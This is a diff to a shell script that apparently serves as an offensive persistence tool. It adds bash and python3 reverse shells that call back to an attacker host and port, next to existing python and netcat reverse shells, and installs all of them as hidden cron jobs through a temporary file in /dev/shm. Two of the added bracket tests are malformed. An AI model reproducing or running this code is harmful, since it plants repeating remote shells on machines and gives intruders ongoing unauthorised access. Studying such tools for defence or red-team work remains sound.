@@ -10,9 +10,19 @@ then
 	root="yes"
 fi
 
+if $(which bash | grep -qi bash);
+then
+	bash="yes"
+fi
+
 if $(which python | grep -qi python);
 then
 	python="yes"
+fi
+
+if $(which python3 | grep -qi python);
+then
+	python3="yes"
 fi
 
 if $(which nc | grep -qi nc);
@@ -46,11 +56,22 @@ fi
 if [ "$crontab" == "yes" ];
 then
 	crontab -l 2> /dev/null > /dev/shm/.cron.sh
+	if ["$bash" == "yes"];
+	then
+		echo "$cron bash -c 'bash -i >& /dev/tcp/$attackBox/$attackPort 0>&1'" >> /dev/shm/.cron.sh
+		echo -e "\e[92m[+]\e[0m Bash reverse shell loaded in crontab"
+		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
+	fi
 	if [ "$python" == "yes" ];
 	then
 		echo "$cron python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" >> /dev/shm/.cron.sh
-		crontab /dev/shm/.cron.sh
 		echo -e "\e[92m[+]\e[0m Python reverse shell loaded in crontab"
+		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
+	fi
+	if ["$python3" == "yes" ];
+	then
+		echo "$cron python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" >> /dev/shm/.cron.sh
+		echo -e "\e[92m[+]\e[0m Python3 reverse shell loaded in crontab"
 		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
 	fi
 	if [ "$nc" == "yes" ];
@@ -58,8 +79,8 @@ then
 		echo "$cron nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /dev/shm/.cron.sh
 		echo -e "\e[92m[+]\e[0m Netcat reverse shell loaded in crontab"
 		echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort on a $cron schedule"
-		crontab /dev/shm/.cron.sh
 	fi
+	crontab /dev/shm/.cron.sh
 	rm /dev/shm/.cron.sh
 fi
 
